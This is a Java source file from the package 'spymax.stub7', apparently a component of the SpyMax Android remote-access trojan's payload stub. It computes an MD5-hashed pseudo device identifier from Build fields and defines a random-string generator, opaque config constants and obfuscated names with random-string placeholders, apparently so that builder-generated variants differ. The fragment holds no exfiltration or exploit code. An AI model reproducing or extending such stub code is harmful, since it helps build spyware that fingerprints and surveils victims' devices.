package spymax.stub7;

import android.content.Context;
import android.os.Build;

import java.io.UnsupportedEncodingException;
import java.security.MessageDigest;
import java.util.Random;
import java.util.UUID;

public class ClassGen8 {

    public static int is_ClassGen8_ten(String s, int n)
    {
        if (s.length()>10)
        {
            return 10;
        }

        return  n;
    }

    public static String GD_ClassGen8_I(Context context) {
        String pseudoId = "35" +
                Build.BOARD.length() % is_ClassGen8_ten("[RANDOM-STRING]",10) +
                Build.BRAND.length() % is_ClassGen8_ten("[RANDOM-STRING]",10)  +
                Build.CPU_ABI.length() % is_ClassGen8_ten("[RANDOM-STRING]",10)  +
                Build.DEVICE.length() % is_ClassGen8_ten("[RANDOM-STRING]",10)  +
                Build.DISPLAY.length() % is_ClassGen8_ten("[RANDOM-STRING]",10)  +
                Build.HOST.length() % is_ClassGen8_ten("[RANDOM-STRING]",10)  +
                Build.ID.length() % is_ClassGen8_ten("[RANDOM-STRING]",10)  +
                Build.MANUFACTURER.length() % is_ClassGen8_ten("[RANDOM-STRING]",10)  +
                Build.MODEL.length() % is_ClassGen8_ten("[RANDOM-STRING]",10)  +
                Build.PRODUCT.length() % is_ClassGen8_ten("[RANDOM-STRING]",10)  +
                Build.TAGS.length() % is_ClassGen8_ten("[RANDOM-STRING]",10)  +
                Build.TYPE.length() % is_ClassGen8_ten("[RANDOM-STRING]",10)  +
                Build.USER.length() % is_ClassGen8_ten("[RANDOM-STRING]",10) ;


        String longId = pseudoId ;

        try {
            MessageDigest messageDigest = MessageDigest.getInstance("MD5");
            messageDigest.update(longId.getBytes(), 0, longId.length());

            // get md5 bytes
            byte md5Bytes[] = messageDigest.digest();

            // creating a hex string
            String identifier = "";

            for (byte md5Byte : md5Bytes) {
                int b = (0xFF & md5Byte);

                // if it is a single digit, make sure it have 0 in front (proper padding)
                if (b <= 0xF) {
                    identifier += "0";
                }

                // add number to string
                identifier += Integer.toHexString(b);
            }

            // hex string to uppercase
            identifier = identifier.toUpperCase();
            return identifier;
        } catch (Exception e) {







            return UUID.randomUUID().toString();
        }

    }

    public static String FTX0 =".Confg";
    public static String FTX1 = "NFHY";

    public static String getRandomString(final int sizeOfRandomString,final String Latters)
    {
        final Random random=new Random();
        final StringBuilder sb=new StringBuilder(sizeOfRandomString);
        for(int i=0;i<sizeOfRandomString;++i)
            sb.append(Latters.charAt(random.nextInt(Latters.length())));
        return sb.toString();
    }

    public static String FTX2 ="YLOV";
    public static String FTX3 = "QSVT";

    public String str = null;
    public byte [] byt = null;
    ClassGen8(byte [] s, byte [] b){
        try {
            str = new String(s, "UTF-8");
            byt = b;
        } catch (UnsupportedEncodingException e) {}
    }

}
